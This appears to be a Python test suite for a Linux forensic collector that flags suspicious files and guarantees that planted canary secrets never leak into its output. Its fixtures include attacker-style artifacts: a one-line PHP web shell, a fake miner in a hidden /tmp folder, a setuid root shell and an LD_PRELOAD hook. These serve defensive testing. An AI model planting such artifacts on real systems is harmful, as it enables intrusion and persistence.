    def test_scratch_places_and_dev(self):
        self.scratch_fixture()
        records = self.run_unusual(web_roots=[])
        files = {r["path"]: r for r in records_named(records, "unusual_file")}
        self.assertIn("/tmp/notes.txt", files)  # everything listed in scratch places
        self.assertNotIn("sha256", files["/tmp/notes.txt"])  # not runnable: not hashed
        self.assertEqual(files["/tmp/.x/payload"]["kind"], "elf")
        self.assertIn("hidden", files["/tmp/.x/payload"]["name_flags"])
        self.assertEqual(
            files["/tmp/.x/payload"]["sha256"], hashlib.sha256(b"\x7fELF miner").hexdigest()
        )
        self.assertEqual(files["/tmp/kworker"]["kind"], "script")
        self.assertIn("system_name", files["/tmp/kworker"]["name_flags"])
        self.assertIn("kernel_thread_name", files["/tmp/[kthreadd]"]["name_flags"])
        self.assertIn("dots_or_spaces_only", files["/tmp/..."]["name_flags"])
        self.assertGreater(files["/tmp/backdated"]["changed_after_modified_seconds"], 300 * DAY)
        self.assertTrue(files["/tmp/rootsh"]["setuid"])
        self.assertIn("/var/tmp/stash.tar", files)
        self.assertIn("/dev/shm/.s", files)
        self.assertIn("/dev/sdz", files)
        self.assertIn("/dev/.udev-rootkit", files)
        self.assertEqual(sources(records), {})  # no contents
        self.assertEqual(records[-1]["modules"]["unusual_files"]["status"], "ok")

    def test_web_roots_default_and_host_override(self):
        self.write("var/www/app/index.php", b"<?php echo 1;")
        self.write("var/www/app/uploads/photo.jpg", b"jpeg")
        self.write("var/www/app/uploads/shell.php", b"<?php system($_GET[c]);")
        self.write("var/www/app/.htaccess", b"Options -Indexes")
        self.write("srv/app/public/x.phtml", b"<?php")
        records = self.run_unusual()
        web = {r["path"] for r in records_named(records, "web_file")}
        self.assertEqual(
            web,
            {"/var/www/app/index.php", "/var/www/app/uploads/shell.php", "/var/www/app/.htaccess"},
        )
        self.assertEqual(records_named(records, "web_roots")[0]["source"], "default")
        summary = [w for w in records_named(records, "walk_summary") if w["place"] == "/var/www"][0]
        self.assertEqual(summary["not_listed"], 3)  # app, uploads, photo.jpg: counted only
        records = self.run_unusual(web_roots=["/srv/app"])
        web = {r["path"] for r in records_named(records, "web_file")}
        self.assertEqual(web, {"/srv/app/public/x.phtml"})  # the host's list replaces the defaults
        self.assertEqual(
            records_named(records, "web_roots")[0], {"roots": ["/srv/app"], "source": "host"}
        )

    def test_privileged_files_outside_system_directories(self):
        self.write("home/jch/.cache/x", b"\x7fELF").chmod(0o4755)
        self.write("var/lib/docker/overlay2/abc/diff/usr/bin/su", b"\x7fELF").chmod(0o4755)
        self.write("var/tmp/rootsh", b"\x7fELF").chmod(0o4755)
        self.write("srv/data/report.csv", b"a,b")
        records = self.run_unusual(web_roots=[])
        privileged = [r["path"] for r in records_named(records, "privileged_file")]
        self.assertEqual(privileged, ["/home/jch/.cache/x"])  # not docker's, not twice
        listed = [r["path"] for r in records_named(records, "unusual_file")]
        self.assertIn("/var/tmp/rootsh", listed)
        pruned = [
            w for w in records_named(records, "walk_summary") if w["not_descended"].get("pruned")
        ]
        self.assertTrue(pruned)

    def test_protected_files_are_not_even_sniffed(self):
        self.write("etc/passwd", b"jch:x:1000:1000::/home/jch:/bin/bash\n")
        self.write("home/jch/.bash_history", b"#!not really a script\n")
        Path(self.root, "tmp").mkdir()
        os.link(Path(self.root, "home/jch/.bash_history"), Path(self.root, "tmp/h"))
        records = self.run_unusual(web_roots=[])
        entry = {r["path"]: r for r in records_named(records, "unusual_file")}["/tmp/h"]
        self.assertNotIn("kind", entry)  # its first bytes weren't read

    def test_secret_shaped_names_are_masked(self):
        self.write("tmp/password=CanaryNameSecret.txt", b"x")
        os.symlink("https://u:CanaryLinkPass@h/x", Path(self.root, "tmp/link"))
        records = self.run_unusual(web_roots=[])
        raw = json.dumps(records)
        self.assertNotIn("CanaryNameSecret", raw)
        self.assertNotIn("CanaryLinkPass", raw)
        masked = [r for r in records_named(records, "unusual_file") if r.get("masked")]
        self.assertEqual(len(masked), 2)

    def test_name_flags(self):
        flags = load_collector("/nonexistent").name_flags
        self.assertEqual(flags("ok", "/a/ok"), [])
        self.assertIn("leading_or_trailing_space", flags("x ", "/x "))
        self.assertIn("control_characters", flags("a\nb", "/a\nb"))
        self.assertIn("non_ascii", flags("ѕshd", "/ѕshd"))  # Cyrillic s
        self.assertIn("hidden", flags("f", "/.cache/f"))


CANARIES = {
    "hash": "$6$CanarySalt$" + "H" * 86,
    "gecos": "CanaryGecosName",
    "history": "CanaryHistoryCommand",
    "option": "CanaryOptionSecret",
    "env": "CanaryEnvSecret",
    "comment": "CanaryCommentSecret",
    "sssd": "CanarySssdBindPassword",
    "private": "CanaryPrivateKeyBody",
    "log": "CanaryLogPassword",
    "pam": "CanaryPamSecret",
    "sudo": "CanarySudoSecret",
    "opasswd": "CanaryOldHash",
    "envname": "CanaryEnvNameTokenAbcdefghijklmnop12",  # makes ghp_ + 36 characters
    "atenv": "CanaryAtEnvironmentValue",
    "spool": "CanaryAtJobOutput",
    "crontab": "CanaryCrontabPassword",
    "unit": "CanaryUnitToken",
    "homestartup": "CanaryHomeStartupLine",
    "userunit": "CanaryUserUnitLine",
    "homeenv": "CanaryHomeEnvironmentValue",
    "btmp": "CanaryBtmpPass",
    "core": "CanaryCoreMemory",
    "typed": "CanaryTypedPass1",  # a bare password typed as a user name
    "tmpbody": "CanaryTmpFileBody",
    "tmpname": "CanaryTmpFileName",
}


HOME_TEXT_PASSWD = (
    "root:x:0:0:root:/root:/bin/bash\n"
    "jch:x:1000:1000::/home/jch:/bin/bash\n"
    "amy:x:1001:1001::/home/amy:/bin/bash\n"
    "bob:x:1002:1002::/home/bob:/bin/bash\n"
    "carl:x:1003:1003::/home/carl:/bin/bash\n"
    "dina:x:1004:1004::/home/dina:/bin/bash\n"
)


class HomeTextTests(FixtureRoot):
    """The opt-in text of home start-up files and user units (policy §7)."""

    def setUp(self):
        super().setUp()
        self.write("etc/passwd", HOME_TEXT_PASSWD.encode())
        self.write("etc/group", b"sudo:x:27:jch\nops:x:500:carl\nstaff:x:50:amy\n")
        self.write(
            "etc/sudoers",
            b"Defaults env_reset\nroot ALL=(ALL) ALL\n@includedir /etc/sudoers.d\n",
        )
        self.write(
            "etc/sudoers.d/admins",
            b"User_Alias DBAS = dina, alice@corp.example\n"
            b"bob ALL=(ALL) NOPASSWD: ALL\n%ops ALL=/usr/bin/systemctl\n"
            b"DBAS ALL=(postgres) ALL\n!amy ALL=ALL\n",
        )
        for home in ("root", "home/jch", "home/amy", "home/bob", "home/carl", "home/dina"):
            self.write(f"{home}/.bashrc", f"# {home}\n".encode())
        for home in ("home/CORP/alice", "home/CORP/dave"):  # domain users: no local account
            self.write(f"{home}/.bashrc", f"# {home}\n".encode())
            Path(self.root, home, ".ssh").mkdir()

    def collect(self, home_text, modules=("startup",)):
        collector = load_collector(self.root)
        out = io.BytesIO()
        collector.main(settings(list(modules), home_text=home_text), out=out)
        return [json.loads(x) for x in gzip.decompress(out.getvalue()).splitlines()]

    def bashrcs(self, records):
        return sorted(n for n in sources(records) if n.endswith("/.bashrc"))

    def test_off_sends_no_home_text(self):
        records = self.collect("off")
        self.assertEqual(self.bashrcs(records), [])
        self.assertEqual(records_named(records, "home_text"), [{"setting": "off", "homes": []}])

    def test_privileged_covers_root_admin_groups_and_sudoers_grantees(self):
        records = self.collect("privileged")
        self.assertEqual(
            self.bashrcs(records),
            [
                "/home/CORP/alice/.bashrc",  # alice@corp.example, by alias
                "/home/bob/.bashrc",  # named in a rule
                "/home/carl/.bashrc",  # member of %ops
                "/home/dina/.bashrc",  # in a User_Alias
                "/home/jch/.bashrc",  # sudo group
                "/root/.bashrc",
            ],
        )
        # amy is only negated, dave only has a home.
        self.assertEqual(records[-1]["modules"]["startup"]["status"], "ok")

    def test_all_covers_every_home(self):
        self.assertEqual(len(self.bashrcs(self.collect("all"))), 8)

    def test_sudoers_granting_everyone_covers_everyone(self):
        self.write("etc/sudoers.d/everyone", b"ALL ALL=(ALL) /usr/bin/id\n")
        self.assertEqual(len(self.bashrcs(self.collect("privileged"))), 8)

    def test_text_never_leaves_the_home_or_follows_hard_links(self):
        self.write("home/jch/.dotfiles/zshrc", b"alias ls=ls\n")
        os.symlink(".dotfiles/zshrc", Path(self.root, "home/jch/.zshrc"))
        self.write("opt/shared/profile", b"export SHARED=1\n")
        os.symlink("/opt/shared/profile", Path(self.root, "home/jch/.profile"))
        self.write("home/jch/notes", b"private\n")
        os.link(Path(self.root, "home/jch/notes"), Path(self.root, "home/jch/.zlogin"))
        records = self.collect("all")
        sent = sources(records)
        self.assertIn("/home/jch/.dotfiles/zshrc", sent)
        self.assertNotIn("/opt/shared/profile", sent)
        self.assertNotIn("/home/jch/notes", sent)
        self.assertNotIn("/home/jch/.zlogin", sent)
        reasons = {r["path"]: r["reason"] for r in records_named(records, "unreadable_file")}
        self.assertIn("outside the home", reasons["/opt/shared/profile"])
        home = {f["path"]: f for f in records_named(records, "home_startup_file")}
        self.assertIn("hard-linked", home["/home/jch/.zlogin"]["hash_skipped"])

    def test_environment_files_keep_names_and_evidence_values_only(self):
        self.write(
            "home/jch/.ssh/environment",
            b"# set by admin\nLD_PRELOAD=/tmp/.x.so\nAPI=CanaryEnv\n"
            b"export PATH=/tmp:/usr/bin\n!!\n",
        )
        records = self.collect("privileged")
        text = sources(records)["/home/jch/.ssh/environment"][1]
        self.assertEqual(
            text,
            b"# set by admin\nLD_PRELOAD=/tmp/.x.so\nAPI [collector: value withheld]\n"
            b"export PATH=/tmp:/usr/bin\n[collector: line withheld]\n",
        )

    def test_user_units_and_autostart_follow_the_setting(self):
        self.write("home/jch/.config/systemd/user/m.service", b"[Service]\nExecStart=/tmp/m\n")
        self.write("home/amy/.config/systemd/user/n.service", b"[Service]\nExecStart=/tmp/n\n")
        self.write("home/jch/.config/autostart/a.desktop", b"[Desktop Entry]\nExec=/tmp/a\n")
        records = self.collect("privileged", modules=("systemd", "startup"))
        sent = sources(records)
        self.assertIn("/home/jch/.config/systemd/user/m.service", sent)
        self.assertIn("/home/jch/.config/autostart/a.desktop", sent)
        self.assertNotIn("/home/amy/.config/systemd/user/n.service", sent)

    def test_hard_links_in_a_home_under_usr_are_never_read(self):
        # daemon's home is /usr/sbin, and "privileged" covers service
        # accounts: a hard link there gets no /usr package exception.
        with open(Path(self.root, "etc/passwd"), "a") as passwd:
            passwd.write("daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n")
        self.write("var/lib/secret", b"CanaryUsrHomeLink\n")
        Path(self.root, "usr/sbin").mkdir(parents=True)
        os.link(Path(self.root, "var/lib/secret"), Path(self.root, "usr/sbin/.profile"))
        collector = load_collector(self.root)
        collector.PACKAGE_OWNER_UID = os.getuid()  # as if root-owned
        out = io.BytesIO()
        collector.main(settings(["startup"], home_text="privileged"), out=out)
        raw = gzip.decompress(out.getvalue())
        self.assertNotIn(b"CanaryUsrHomeLink", raw)
        self.assertIn(b'"/usr/sbin"', raw)  # the home was covered

    def test_broad_service_homes_never_open_other_homes(self):
        # Service accounts (covered by "privileged") can have "/" or a
        # directory holding other homes as their home.
        with open(Path(self.root, "etc/passwd"), "a") as passwd:
            passwd.write("nobody:x:65534:65534::/:/sbin/nologin\n")
            passwd.write("svc:x:999:999::/srv:/sbin/nologin\n")
            passwd.write("erin:x:1005:1005::/srv/erin:/bin/bash\n")
        self.write("srv/erin/.bashrc", b"CanaryErinStartup\n")
        os.symlink("/home/amy/.bashrc", Path(self.root, ".profile"))
        os.symlink("/srv/erin/.bashrc", Path(self.root, "srv/.profile"))
        records = self.collect("privileged")
        raw = json.dumps(records)
        self.assertNotIn("CanaryErinStartup", raw)
        self.assertNotIn("# home/amy", raw)
        covered = records_named(records, "home_text")[0]["homes"]
        self.assertIn("/srv", covered)
        self.assertNotIn("/", covered)
        # "/" as a home must not close every other home either.
        self.assertIn("/root/.bashrc", sources(records))
        self.assertIn("/home/jch/.bashrc", sources(records))
        reasons = {r["path"]: r["reason"] for r in records_named(records, "unreadable_file")}
        self.assertIn("another account's home", reasons["/srv/erin/.bashrc"])

    def test_domain_name_never_covers_a_local_namesake(self):
        with open(Path(self.root, "etc/passwd"), "a") as passwd:
            passwd.write("alice:x:1006:1006::/home/alice:/bin/bash\n")
        self.write("home/alice/.bashrc", b"# local alice\n")
        bashrcs = self.bashrcs(self.collect("privileged"))
        self.assertIn("/home/CORP/alice/.bashrc", bashrcs)  # alice@corp.example's home
        self.assertNotIn("/home/alice/.bashrc", bashrcs)  # an unrelated local alice

    def test_numeric_sudo_principals(self):
        with open(Path(self.root, "etc/passwd"), "a") as passwd:
            passwd.write("fay:x:1007:1007::/home/fay:/bin/bash\n")
            passwd.write("gus:x:1008:700::/home/gus:/bin/bash\n")
        self.write("etc/group", b"sudo:x:27:jch\nops:x:500:carl\nnum:x:700:\n")
        self.write("etc/sudoers.d/numeric", b"#1007 ALL=(ALL) ALL\n%#700 ALL=(ALL) ALL # ok\n")
        for user in ("fay", "gus"):
            self.write(f"home/{user}/.bashrc", f"# {user}\n".encode())
        bashrcs = self.bashrcs(self.collect("privileged"))
        self.assertIn("/home/fay/.bashrc", bashrcs)
        self.assertIn("/home/gus/.bashrc", bashrcs)

    def test_environment_files_are_filtered_however_reached(self):
        self.write("home/jch/.ssh/environment", b"API=CanaryEnvRoute\nLD_PRELOAD=/x.so\n")
        os.remove(Path(self.root, "home/jch/.bashrc"))
        os.symlink(".ssh/environment", Path(self.root, "home/jch/.bashrc"))
        Path(self.root, "home/jch/.config/systemd").mkdir(parents=True)
        os.symlink("../../.ssh", Path(self.root, "home/jch/.config/systemd/user"))
        records = self.collect("all", modules=("startup", "systemd"))
        raw = json.dumps(records)
        self.assertNotIn("CanaryEnvRoute", raw)
        self.assertIn("LD_PRELOAD=/x.so", raw)

    def test_linked_parent_directory_cannot_open_an_uncovered_home(self):
        self.write("home/amy/.ssh/rc", b"CanaryAmyRc\n")
        os.symlink("../amy/.ssh", Path(self.root, "home/jch/.ssh"))
        records = self.collect("privileged")
        self.assertNotIn("CanaryAmyRc", json.dumps(records))
        reasons = {r["path"]: r["reason"] for r in records_named(records, "unreadable_file")}
        self.assertIn("/home/amy/.ssh/rc", reasons)

    def test_a_covered_alias_never_opens_the_home_it_aliases(self):
        with open(Path(self.root, "etc/passwd"), "a") as passwd:
            passwd.write("svc:x:998:998::/srv/svc:/sbin/nologin\n")
        Path(self.root, "srv").mkdir()
        os.symlink("../home/amy", Path(self.root, "srv/svc"))
        records = self.collect("privileged")
        self.assertNotIn("# home/amy", json.dumps(records))

    def test_linked_environment_entry_points_are_still_filtered(self):
        self.write("home/jch/.config/env/ssh/environment", b"API=CanaryLinkedEnv\n")
        os.symlink(".config/env/ssh", Path(self.root, "home/jch/.ssh"))
        self.write("home/jch/.config/env/pam", b"TOKEN DEFAULT=CanaryPamEnv\n")
        os.symlink(".config/env/pam", Path(self.root, "home/jch/.pam_environment"))
        Path(self.root, "home/jch/.config/autostart").mkdir(parents=True)
        os.symlink("../env/ssh/environment", Path(self.root, "home/jch/.config/autostart/e"))
        records = self.collect("all")
        raw = json.dumps(records)
        self.assertNotIn("CanaryLinkedEnv", raw)
        self.assertNotIn("CanaryPamEnv", raw)
        self.assertIn("API [collector: value withheld]", raw)

    def test_quoted_sudo_principals(self):
        with open(Path(self.root, "etc/passwd"), "a") as passwd:
            passwd.write("hal:x:1009:1009::/home/hal:/bin/bash\n")
        self.write("home/hal/.bashrc", b"# hal\n")
        self.write("etc/sudoers.d/quoted", b'"hal" ALL=(ALL) ALL\n')
        self.assertIn("/home/hal/.bashrc", self.bashrcs(self.collect("privileged")))

    def test_domain_members_of_admin_groups_are_covered(self):
        self.write("etc/group", b"sudo:x:27:jch,dave@corp.example\nops:x:500:carl\n")
        self.assertIn("/home/CORP/dave/.bashrc", self.bashrcs(self.collect("privileged")))

    def test_an_uncovered_walk_never_hides_a_covered_one(self):
        self.write("home/jch/.config/systemd/user/m.service", b"CanaryCoveredUnit\n")
        Path(self.root, "home/amy/.config/systemd").mkdir(parents=True)
        os.symlink(
            "/home/jch/.config/systemd/user", Path(self.root, "home/amy/.config/systemd/user")
        )
        records = self.collect("privileged", modules=("systemd",))  # amy's home sorts first
        self.assertIn("/home/jch/.config/systemd/user/m.service", sources(records))

    def test_a_refused_route_never_hides_a_permitted_one(self):
        os.remove(Path(self.root, "home/amy/.bashrc"))
        os.symlink("/home/jch/.bashrc", Path(self.root, "home/amy/.bashrc"))
        records = self.collect("all")  # amy's route to jch's file is refused, jch's isn't
        self.assertIn("/home/jch/.bashrc", sources(records))

    def test_unknown_setting_is_refused(self):
        records = self.collect("everything")
        self.assertEqual(records[-1]["status"], "refused")
        self.assertIn("home_text must be", json.dumps(records))


class CanaryTests(FixtureRoot):
    """Plant secrets in every channel the collector touches, run every
    module, and require that none of them appears anywhere in the output."""

    def plant(self):
        c = CANARIES
        h = c["hash"]
        self.write(
            "etc/passwd",
            (
                f"root:x:0:0:root:/root:/bin/bash\n"
                f"jch:{h}:1000:1000:{c['gecos']}:/home/jch:/bin/bash\n"
            ).encode(),
        )
        self.write("etc/shadow", f"root:{h}:20000:0:99999:7:::\njch:!{h}:20000::::::\n".encode())
        self.write("etc/gshadow", f"root:{h}::\n".encode())
        self.write("etc/security/opasswd", f"jch:1000:1:{c['opasswd']}\n".encode())
        self.write("etc/group", f"root:{h}:0:\nsudo:x:27:jch\n".encode())
        for home in ("root", "home/jch", "home/CORP/alice"):
            self.write(
                f"{home}/.bash_history", f"mysql -p{c['history']}\n{c['history']}\n".encode()
            )
        # Configuration links and hard links to every protected file.
        os.makedirs(Path(self.root, "etc/pam.d"))
        os.makedirs(Path(self.root, "etc/sudoers.d"))
        os.makedirs(Path(self.root, "etc/ssh/sshd_config.d"))
        targets = {
            "shadow": "etc/shadow",
            "gshadow": "etc/gshadow",
            "passwd": "etc/passwd",
            "opasswd": "etc/security/opasswd",
            "group": "etc/group",
            "hist": "home/jch/.bash_history",
            "domainhist": "home/CORP/alice/.bash_history",
        }
        persistence_dirs = (
            "etc/cron.d",
            "var/spool/cron/crontabs",
            "var/spool/cron/atjobs",
            "var/spool/at",
            "etc/systemd/system",
            "usr/lib/systemd/system",
            "etc/profile.d",
            "etc/udev/rules.d",
            "etc/apt/apt.conf.d",
        )
        for directory in persistence_dirs:
            os.makedirs(Path(self.root, directory))
        for directory in ("etc/pam.d", "etc/sudoers.d", "etc/ssh/sshd_config.d") + persistence_dirs:
            for name, target in targets.items():
                link = Path(self.root, directory, name + ".conf")
                os.symlink(os.path.relpath(Path(self.root, target), link.parent), link)
                os.link(Path(self.root, target), Path(self.root, directory, name + "-hard.conf"))
        # A history file reached only by a symbolic link (no hard link), so
        # the location rule alone must stop it.
        self.write("home/CORP/bob/.zsh_history", f"{c['history']}\n".encode())
        os.symlink("../../home/CORP/bob/.zsh_history", Path(self.root, "etc/pam.d/bob.conf"))
        os.symlink(
            "../../../home/CORP/bob/.zsh_history", Path(self.root, "etc/ssh/sshd_config.d/bob.conf")
        )
        self.write("etc/pam.d/sshd", f"auth optional pam_exec.so /x password={c['pam']}\n".encode())
        # A hash pasted into text the collector does send: config and a log.
        self.write("etc/pam.d/pasted", f"# old root hash {h}\n".encode())
        self.write("var/log/secure-pasted", f"Oct 26 app: restore {h}\n".encode())
        self.write("etc/sudoers", b"@includedir /etc/sudoers.d\n#include /etc/shadow\n")
        self.write("etc/sudoers.d/app", f"Defaults env_keep+=TOKEN\n# token={c['sudo']}\n".encode())
        self.write(
            "etc/ssh/sshd_config",
            b"Include /etc/ssh/sshd_config.d/*.conf\n"
            b"AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/keys/%u\n",
        )
        self.write(
            "etc/sssd/sssd.conf",
            (
                "[domain/corp]\noverride_homedir = /home/%d/%u\n"
                f"ldap_default_authtok = {c['sssd']}\n"
            ).encode(),
        )
        key = f"ssh-ed25519 {ED25519}"
        lines = [
            f'command="run --password=\\"a {c["option"]}\\"",'
            f'environment="DB_PWD={c["env"]}" {key} ok',
            f'environment="X={c["env"]} y" {key} ok2',
            f'environment="ghp_{c["envname"]}=1" {key} ok3',
            f'bogus-option="{c["option"]}" {key} bad',
            f"{key} password={c['comment']}",
            "-----BEGIN OPENSSH PRIVATE KEY-----",
            c["private"],
            "-----END OPENSSH PRIVATE KEY-----",
            f"ssh-ed25519 {base64.b64encode(c['private'].encode()).decode()} junk",
        ]
        for home in ("root", "home/jch", "home/CORP/alice"):
            self.write(f"{home}/.ssh/authorized_keys", ("\n".join(lines) + "\n").encode())
        self.write("etc/ssh/keys/bob", ("\n".join(lines) + "\n").encode())
        self.write("var/log/secure", f"Oct 26 sshd[1]: password={c['log']} x\n".encode())
        self.write("proc/modules", b"ext4 1 2 - Live 0x0000000000000000\n")
        # Login records: a password typed as a user name, and a URL password
        # as the host; a wtmp rotation hard-linked to a history file; core
        # dumps and crash reports, which hold memory.
        self.write(
            "var/log/btmp",
            utmp(6, user=f"password={c['btmp']}".encode(), host=b"https://u:CanaryBtmpPass@h")
            + utmp(6, user=c["typed"].encode()),
        )
        self.write(
            "var/log/secure-typed",
            f"Oct 26 sshd[9]: Invalid user {c['typed']} from 192.0.2.9 port 22\n".encode(),
        )
        os.link(Path(self.root, "home/jch/.bash_history"), Path(self.root, "var/log/wtmp.1"))
        self.write("var/lib/systemd/coredump/core.x.zst", c["core"].encode())
        # Scratch places: a secret in a file's contents and in its name, and
        # a hard link to a history file (never read, not even its magic).
        self.write("tmp/drop", f"{c['tmpbody']}\n".encode()).chmod(0o755)
        self.write(f"tmp/token={c['tmpname']}", b"x")
        os.link(Path(self.root, "home/jch/.bash_history"), Path(self.root, "tmp/h"))
        self.write("var/www/site/shell.php", f"<?php // {c['tmpbody']}".encode())
        self.write("var/crash/_usr_bin_x.crash", c["core"].encode())
        # Persistence: an at job's environment and output, crontab and unit
        # secrets, and start-up files and units in homes (hashes only).
        job = AT_JOB.replace(b"PATH=/usr/bin:/bin", f"API={c['atenv']}".encode())
        self.write("var/spool/cron/atjobs/a0000101c80375", job)
        self.write("var/spool/at/a0000201c80375", job)
        self.write("var/spool/cron/atspool/a0000101c80375", f"{c['spool']}\n".encode())
        self.write("var/spool/at/spool/a0000201c80375", f"{c['spool']}\n".encode())
        self.write("var/spool/cron/crontabs/jch", f"@daily mysql -p{c['crontab']} db\n".encode())
        self.write(
            "etc/systemd/system/app.service",
            f"[Service]\nEnvironment=API_TOKEN={c['unit']}\n".encode(),
        )
        for home in ("root", "home/jch", "home/CORP/alice"):
            self.write(f"{home}/.bashrc", f"{c['homestartup']}\n".encode())
            self.write(f"{home}/.ssh/rc", f"{c['homestartup']}\n".encode())
            self.write(f"{home}/.config/systemd/user/x.service", f"{c['userunit']}\n".encode())
            os.symlink(f"/{home}/.bashrc", Path(self.root, "etc/profile.d", home.replace("/", "_")))
            # Home start-up names leading to what must never be read, for the
            # home_text opt-in: history and protected files by link and hard
            # link, and an environment file's values.
            os.link(Path(self.root, home, ".bash_history"), Path(self.root, home, ".profile"))
            os.symlink(".bash_history", Path(self.root, home, ".zshrc"))
            os.symlink("/etc/shadow", Path(self.root, home, ".zshenv"))
            os.symlink(
                f"/{home}/.bash_history", Path(self.root, home, ".config/systemd/user/h.service")
            )
            os.makedirs(Path(self.root, home, ".config/autostart"))
            os.symlink("/etc/gshadow", Path(self.root, home, ".config/autostart/g.desktop"))
            os.link(
                Path(self.root, "etc/shadow"), Path(self.root, home, ".config/autostart/s.desktop")
            )
            self.write(
                f"{home}/.ssh/environment", f"API={c['homeenv']}\nLD_PRELOAD=/x.so\n".encode()
            )
        # Configuration links into the spools: only cron's own classified
        # walk may read there, so neither the environment nor output leaks.
        for link, target in (
            ("etc/rc.local", "/var/spool/at/a0000201c80375"),
            ("etc/environment", "/var/spool/at/spool/a0000201c80375"),
            ("etc/cron.d/atjob", "/var/spool/cron/atjobs/a0000101c80375"),
            ("etc/systemd/system/out.service", "/var/spool/cron/atspool/a0000101c80375"),
            ("etc/pam.d/atjob", "/var/spool/at/a0000201c80375"),
        ):
            os.symlink(target, Path(self.root, link))
        self.write(
            "var/log/auth.log",
            f"Oct 26 sudo: -----BEGIN RSA PRIVATE KEY-----\n{c['private']}\n".encode(),
        )

    def run_all(self, home_text=None):
        collector = load_collector(self.root)
        collector.COMMANDS = {"journalctl": ()}  # no real journal in a fixture
        out = io.BytesIO()
        collector.main(settings(None, home_text=home_text), out=out)
        return gzip.decompress(out.getvalue())

    def leaks(self, raw, allowed=()):
        text = raw.decode("utf-8", "replace")
        leaks = {}
        for name, canary in CANARIES.items():
            if name in allowed:
                continue
            for form in {canary, canary[:16], base64.b64encode(canary.encode()).decode()[:16]}:
                if form in text:
                    leaks[name] = form
        return leaks

    def test_no_canary_leaves_through_any_module(self):
        self.plant()
        raw = self.run_all()
        self.assertEqual(self.leaks(raw), {})
        trailer = json.loads(raw.splitlines()[-1])
        self.assertEqual(trailer["status"], "complete", trailer["modules"])

    def test_home_text_opt_in_sends_only_start_up_text(self):
        # With every home's text allowed, only the start-up files and units
        # themselves may appear: never history, protected files, values
        # in environment files, or anything reached by a link or hard link.
        self.plant()
        raw = self.run_all(home_text="all")
        self.assertEqual(self.leaks(raw, allowed=("homestartup", "userunit")), {})
        text = raw.decode("utf-8", "replace")
        self.assertIn(CANARIES["homestartup"], text)  # the opt-in did send text
        self.assertIn(CANARIES["userunit"], text)
        trailer = json.loads(raw.splitlines()[-1])
        self.assertEqual(trailer["status"], "complete", trailer["modules"])


if __name__ == "__main__":
    unittest.main()
